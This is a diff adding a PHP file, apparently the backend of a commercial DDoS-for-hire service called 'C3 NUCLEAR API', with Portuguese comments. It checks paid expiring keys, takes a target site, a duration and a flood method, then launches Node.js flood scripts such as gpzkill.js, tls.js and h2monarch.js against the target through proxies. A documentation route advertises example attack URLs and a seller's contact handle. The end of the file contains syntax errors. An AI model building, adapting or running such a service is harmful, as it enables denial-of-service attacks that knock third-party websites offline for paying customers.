@@ -1,0 +1,526 @@
+
+<?php
+// ============================================================
+// API.PHP - API DE ATAQUES C3 NUCLEAR
+// ============================================================
+
+header('Content-Type: application/json; charset=utf-8');
+error_reporting(E_ALL);
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+
+// ============================================================
+// CONFIGURAÇÕES
+// ============================================================
+$KEYS_FILE = '/root/botc3/keys.json';
+$ATTACKS_FILE = '/root/botc3/attacks.json';
+$SCRIPT_DIR = '/root/botc3/';
+$LOG_DIR = '/root/botc3/logs/';
+$PROXY_FILE = 'proxy.txt';
+
+// Criar diretórios
+if (!file_exists($LOG_DIR)) mkdir($LOG_DIR, 0777, true);
+
+// ============================================================
+// FUNÇÕES DE KEY
+// ============================================================
+function loadKeys() {
+    global $KEYS_FILE;
+    if (file_exists($KEYS_FILE)) {
+        $content = file_get_contents($KEYS_FILE);
+        $decrypted = base64_decode($content, true);
+        if ($decrypted === false) {
+            $data = json_decode($content, true);
+            return is_array($data) ? $data : [];
+        }
+        $data = json_decode($decrypted, true);
+        return is_array($data) ? $data : [];
+    }
+    return [];
+}
+
+function validateKey($key) {
+    $keys = loadKeys();
+    
+    if (!isset($keys[$key])) {
+        return ['valid' => false, 'error' => 'Chave inválida'];
+    }
+    
+    $keyData = $keys[$key];
+    
+    if (!isset($keyData['active']) || !$keyData['active']) {
+        return ['valid' => false, 'error' => 'Chave desativada'];
+    }
+    
+    if (time() > $keyData['expires_at']) {
+        $keys[$key]['active'] = false;
+        $json = json_encode($keys, JSON_PRETTY_PRINT);
+        file_put_contents($KEYS_FILE, base64_encode($json));
+        return ['valid' => false, 'error' => 'Chave expirada'];
+    }
+    
+    return ['valid' => true, 'data' => $keyData];
+}
+
+function getAttackId() {
+    return rand(1000, 9999);
+}
+
+// ============================================================
+// FUNÇÕES AUXILIARES
+// ============================================================
+function normalizeTarget($target) {
+    $target = trim($target);
+    $target = rtrim($target, '/');
+    if (!preg_match('/^https?:\/\//', $target)) {
+        $target = 'https://' . $target;
+    }
+    return $target;
+}
+
+function extractHost($target) {
+    $host = preg_replace('/^https?:\/\//', '', $target);
+    $host = explode('/', $host)[0];
+    $host = explode(':', $host)[0];
+    return $host;
+}
+
+function resolveIP($host) {
+    $host = preg_replace('/^https?:\/\//', '', $host);
+    $host = explode('/', $host)[0];
+    $ip = gethostbyname($host);
+    return ($ip && $ip !== $host) ? $ip : 'Nao resolvido';
+}
+
+function getMethods() {
+    return [
+        'kill' => ['nome' => 'KILL', 'script' => 'gpzkill.js'],
+        'ar' => ['nome' => 'GPZ-AR', 'script' => 'ar.js'],
+        'wx' => ['nome' => 'WX', 'script' => 'gpzwx.js'],
+        'tls' => ['nome' => 'TLS', 'script' => 'tls.js'],
+        'tls1' => ['nome' => 'TLS1', 'script' => 'tls1.js'],
+        'http' => ['nome' => 'HTTP', 'script' => 'http.js'],
+        'flooder' => ['nome' => 'FLOODER', 'script' => 'flooder.js'],
+        'c3' => ['nome' => 'C3', 'script' => 'c3.js'],
+        'h2' => ['nome' => 'H2', 'script' => 'c4.js'],
+        'h2monarch' => ['nome' => 'H2-MONARCH', 'script' => 'h2monarch.js']
+    ];
+}
+
+function iniciarAtaque($scriptName, $target, $time, $instance) {
+    global $SCRIPT_DIR, $LOG_DIR, $PROXY_FILE;
+    
+    $scriptPath = $SCRIPT_DIR . $scriptName;
+    
+    if (!file_exists($scriptPath)) {
+        return ['success' => false, 'error' => 'Script não encontrado: ' . $scriptName];
+    }
+    
+    $nodePath = trim(shell_exec("which node 2>/dev/null"));
+    if (empty($nodePath)) {
+        return ['success' => false, 'error' => 'Node.js não encontrado'];
+    }
+    
+    $normalizedTarget = normalizeTarget($target);
+    $fixedRps = 6;
+    $fixedThreads = 2;
+    $proxyPath = $SCRIPT_DIR . $PROXY_FILE;
+    $hasProxy = file_exists($proxyPath);
+    
+    $logFile = $LOG_DIR . 'api_' . str_replace('.js', '', $scriptName) . '_' . time() . '_' . $instance . '.log';
+    
+    if ($hasProxy) {
+        $args = [
+            escapeshellarg($scriptPath),
+            escapeshellarg($normalizedTarget),
+            intval($time),
+            $fixedRps,
+            $fixedThreads,
+            escapeshellarg($PROXY_FILE)
+        ];
+    } else {
+        $args = [
+            escapeshellarg($scriptPath),
+            escapeshellarg($normalizedTarget),
+            intval($time),
+            $fixedRps,
+            $fixedThreads
+        ];
+    }
+    
+    $displayCommand = "node " . $scriptName . " " . $normalizedTarget . " " . $time . " " . $fixedRps . " " . $fixedThreads . ($hasProxy ? " " . $PROXY_FILE : "");
+    
+    $bgCommand = "cd " . escapeshellarg($SCRIPT_DIR) . " && nohup " . 
+                 escapeshellarg($nodePath) . " " . implode(" ", $args) . 
+                 " >> " . escapeshellarg($logFile) . " 2>&1 & echo $!";
+    
+    $pid = trim(shell_exec($bgCommand));
+    
+    if (!empty($pid) && is_numeric($pid) && $pid > 0) {
+        usleep(200000);
+        return [
+            'success' => true, 
+            'pid' => $pid, 
+            'log' => $logFile,
+            'command_display' => $displayCommand
+        ];
+    }
+    
+    return ['success' => false, 'error' => 'Falha ao iniciar processo'];
+}
+
+// ============================================================
+// FUNÇÃO PARA PARAR ATAQUE
+// ============================================================
+function stopAttack($attackId) {
+    $attacks = [];
+    if (file_exists($ATTACKS_FILE)) {
+        $attacks = json_decode(file_get_contents($ATTACKS_FILE), true) ?? [];
+    }
+    
+    $found = false;
+    foreach ($attacks as $id => $attack) {
+        if ($attack['id'] == $attackId && $attack['status'] === 'executando') {
+            // Matar processo
+            if (isset($attack['pid'])) {
+                exec("kill -9 " . intval($attack['pid']) . " 2>/dev/null");
+            }
+            $attacks[$id]['status'] = 'parado';
+            $found = true;
+            break;
+        }
+    }
+    
+    file_put_contents($ATTACKS_FILE, json_encode($attacks, JSON_PRETTY_PRINT));
+    return $found;
+}
+
+// ============================================================
+// FUNÇÃO PARA VER STATUS DA KEY
+// ============================================================
+function getKeyStatus($key) {
+    $keys = loadKeys();
+    
+    if (!isset($keys[$key])) {
+        return ['success' => false, 'error' => 'Chave inválida'];
+    }
+    
+    $keyData = $keys[$key];
+    $now = time();
+    $remaining = max(0, $keyData['expires_at'] - $now);
+    
+    // Contar ataques ativos
+    $attacks = [];
+    if (file_exists($ATTACKS_FILE)) {
+        $attacks = json_decode(file_get_contents($ATTACKS_FILE), true) ?? [];
+    }
+    
+    $activeAttacks = 0;
+    foreach ($attacks as $attack) {
+        if (isset($attack['api_key']) && $attack['api_key'] === $key) {
+            if ($attack['status'] === 'executando') {
+                $activeAttacks++;
+            }
+        }
+    }
+    
+    return [
+        'success' => true,
+        'key' => $key,
+        'user_id' => $keyData['user_id'],
+        'simultaneos' => $keyData['simultaneous'],
+        'tempo_maximo' => $keyData['max_time'] . 's',
+        'ataques_ativos' => $activeAttacks,
+        'limite_simultaneos' => $keyData['simultaneous'],
+        'tempo_restante' => formatDuration($remaining),
+        'expira_em' => date('d/m/Y H:i:s', $keyData['expires_at']),
+        'ativa' => $keyData['active'] && $remaining > 0
+    ];
+}
+
+function formatDuration($seconds) {
+    $days = floor($seconds / 86400);
+    $hours = floor(($seconds % 86400) / 3600);
+    $minutes = floor(($seconds % 3600) / 60);
+    
+    if ($days > 0) return $days . 'd ' . $hours . 'h';
+    if ($hours > 0) return $hours . 'h ' . $minutes . 'm';
+    if ($minutes > 0) return $minutes . 'm';
+    return $seconds . 's';
+}
+
+// ============================================================
+// ROTA: DOCUMENTAÇÃO
+// ============================================================
+if (isset($_GET['documentacao']) || isset($_GET['docs'])) {
+    echo json_encode([
+        'success' => true,
+        'nome' => 'C3 NUCLEAR API',
+        'versao' => '1.0',
+        'rotas' => [
+            [
+                'rota' => 'api.php?key=SUA_KEY&alvo=site.com&time=60&smtn=1&ojiva=kill',
+                'metodo' => 'GET',
+                'descricao' => 'Iniciar ataque',
+                'parametros' => [
+                    'key' => 'Sua API Key (obrigatório)',
+                    'alvo' => 'URL ou IP do alvo (obrigatório)',
+                    'time' => 'Tempo em segundos (padrão: 60)',
+                    'smtn' => 'Simultâneos (padrão: 1)',
+                    'ojiva' => 'kill, ar, wx, tls, tls1, http, flooder, c3, h2, h2monarch (padrão: kill)'
+                ]
+            ],
+            [
+                'rota' => 'api.php?stopc3=ID_DO_ATAQUE',
+                'metodo' => 'GET',
+                'descricao' => 'Parar ataque pelo ID',
+                'parametros' => [
+                    'stopc3' => 'ID do ataque (ex: 1828)'
+                ]
+            ],
+            [
+                'rota' => 'api.php?status=SUA_KEY',
+                'metodo' => 'GET',
+                'descricao' => 'Ver status da sua Key',
+                'parametros' => [
+                    'status' => 'Sua API Key'
+                ]
+            ],
+            [
+                'rota' => 'api.php?documentacao',
+                'metodo' => 'GET',
+                'descricao' => 'Mostra esta documentação'
+            ]
+        ],
+        'ojivas_disponiveis' => [
+            'kill', 'ar', 'wx', 'tls', 'tls1', 
+            'http', 'flooder', 'c3', 'h2', 'h2monarch'
+        ],
+        'exemplo' => [
+            'iniciar_ataque' => 'api.php?key=SUA_KEY&alvo=site.com&time=60&smtn=1&ojiva=kill',
+            'parar_ataque' => 'api.php?stopc3=1828',
+            'ver_status' => 'api.php?status=SUA_KEY'
+        ],
+        'contato' => '@gaspazinha'
+    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    exit;
+}
+
+// ============================================================
+// ROTA: PARAR ATAQUE
+// ============================================================
+if (isset($_GET['stopc3'])) {
+    $attackId = intval($_GET['stopc3']);
+    
+    if ($attackId < 1000 || $attackId > 9999) {
+        echo json_encode([
+            'success' => false,
+            'error' => 'ID inválido. Use um ID entre 1000 e 9999'
+        ]);
+        exit;
+    }
+    
+    if (stopAttack($attackId)) {
+        echo json_encode([
+            'success' => true,
+            'message' => '✅ Ataque parado com sucesso!',
+            'id' => $attackId,
+            'status' => 'parado'
+        ]);
+    } else {
+        echo json_encode([
+            'success' => false,
+            'error' => '❌ Ataque não encontrado ou já finalizado',
+            'id' => $attackId
+        ]);
+    }
+    exit;
+}
+
+
+if (isset($_GET['status'])) {
+    $key = trim($_GET['status']);
+    
+    $result = getKeyStatus($key);
+    
+    if ($result['success']) {
+        echo json_encode([
+            'success' => true,
+            'key' => $result['key'],
+            'usuario' => $result['user_id'],
+            'simultaneos' => $result['simultaneos'],
+            'tempo_maximo' => $result['tempo_maximo'],
+            'ataques_ativos' => $result['ataques_ativos'],
+            'limite_simultaneos' => $result['limite_simultaneos'],
+            'tempo_restante' => $result['tempo_restante'],
+            'expira_em' => $result['expira_em'],
+            'ativa' => $result['ativa']
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    } else {
+        echo json_encode([
+            'success' => false,
+            'error' => $result['error']
+        ]);
+    }
+    exit;
+}
+
+//aqui EA verificação da rota de attack 
+$apiKey = isset($_GET['key']) ? trim($_GET['key']) : '';
+$target = isset($_GET['alvo']) ? trim($_GET['alvo']) : '';
+$time = isset($_GET['time']) ? intval($_GET['time']) : 60;
+$simultaneous = isset($_GET['smtn']) ? intval($_GET['smtn']) : 1;
+$method = isset($_GET['ojiva']) ? trim(strtolower($_GET['ojiva'])) : 'kill';
+
+
+if (empty($apiKey)) {
+    echo json_encode(['success' => false, 'error' => 'API KEY não fornecida']);
+    exit;
+}
+
+$validation = validateKey($apiKey);
+if (!$validation['valid']) {
+    echo json_encode(['success' => false, 'error' => $validation['error']]);
+    exit;
+}
+
+$keyData = $validation['data'];
+
+
+if (empty($target)) {
+    echo json_encode(['success' => false, 'error' => 'Alvo não fornecido']);
+    exit;
+}
+
+$normalizedTarget = normalizeTarget($target);
+$host = extractHost($normalizedTarget);
+
+
+if ($time < 10) {
+    echo json_encode(['success' => false, 'error' => 'Tempo mínimo: 10 segundos']);
+    exit;
+}
+
+if ($time > $keyData['max_time']) {
+    echo json_encode(['success' => false, 'error' => 'Tempo máximo permitido: ' . $keyData['max_time'] . 's']);
+    exit;
+}
+
+
+if ($simultaneous > $keyData['simultaneous']) {
+    echo json_encode(['success' => false, 'error' => 'Simultâneos máximo permitido: ' . $keyData['simultaneous']]);
+    exit;
+}
+
+
+$methods = getMethods();
+$methodMap = [
+    'kill' => 'gpzkill.js',
+    'ar' => 'ar.js',
+    'wx' => 'gpzwx.js',
+    'tls' => 'tls.js',
+    'tls1' => 'tls1.js',
+    'http' => 'http.js',
+    'flooder' => 'flooder.js',
+    'c3' => 'c3.js',
+    'h2' => 'c4.js',
+    'h2monarch' => 'h2monarch.js'
+];
+
+if (isset($methodMap[$method])) {
+    $methodConfig = ['nome' => strtoupper($method), 'script' => $methodMap[$method]];
+} else {
+    $methodConfig = ['nome' => 'KILL', 'script' => 'gpzkill.js'];
+}
+
+
+$attacks = [];
+if (file_exists($ATTACKS_FILE)) {
+    $attacks = json_decode(file_get_contents($ATTACKS_FILE), true) ?? [];
+}
+
+$currentSimultaneous = 0;
+$now = time();
+
+foreach ($attacks as $id => $attack) {
+    if (isset($attack['api_key']) && $attack['api_key'] === $apiKey) {
+        if ($attack['status'] === 'executando' && $attack['end_time'] > $now) {
+            $currentSimultaneous += $attack['simultaneous'];
+        } elseif ($attack['end_time'] <= $now && $attack['status'] === 'executando') {
+            $attacks[$id]['status'] = 'finalizado';
+        }
+    }
+}
+
+if (($currentSimultaneous + $simultaneous) > $keyData['simultaneous']) {
+    echo json_encode([
+        'success' => false,
+        'error' => 'Limite de simultâneos excedido! Rodando: ' . $currentSimultaneous . ' de ' . $keyData['simultaneous']
+    ]);
+    exit;
+}
+
+
+$attackId = getAttackId();
+$attackIds = [];
+
+
+$processosIniciados = 0;
+$pids = [];
+
+for ($i = 0; $i < $simultaneous; $i++) {
+    $result = iniciarAtaque($methodConfig['script'], $normalizedTarget, $time, $i + 1);
+    
+    if ($result['success']) {
+        $processosIniciados++;
+        $pids[] = $result['pid'];
+        
+        $attackIds[] = $attackId;
+        
+        $attacks[$attackId . '_' . $i] = [
+            'id' => $attackId,
+            'target' => $host,
+            'url' => $normalizedTarget,
+            'ip' => resolveIP($target),
+            'time' => $time,
+            'simultaneous' => 1,
+            'method' => $methodConfig['nome'],
+            'user_id' => $keyData['user_id'],
+            'api_key' => $apiKey,
+            'start_time' => time(),
+            'end_time' => time() + $time,
+            'status' => 'executando',
+            'pid' => $result['pid'],
+            'log' => $result['log'],
+            'rps' => 6,
+            'threads' => 2
+        ];
+    }
+}
+
+file_put_contents($ATTACKS_FILE, json_encode($attacks, JSON_PRETTY_PRINT));
+
+if ($processosIniciados === 0) {
+    echo json_encode([
+        'success' => false,
+        'error' => 'Falha ao iniciar ataque. Verifique os logs.'
+    ]);
+    exit;
+}
+
+
+echo json_encode([
+    'success' => true,
+    'status' => 'iniciado com sucesso',
+    'ojiva' => $methodConfig['nome'],
+    'time' => $time . 's',
+    'simultaneos' => $processosIniciados,
+    'id' => $attackId,
+    'alvo' => $host,
+    'pids' => $pids,
+    'rps' => 6,
+    'threads' => 2'
+    ]
+], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+exit;
+?>
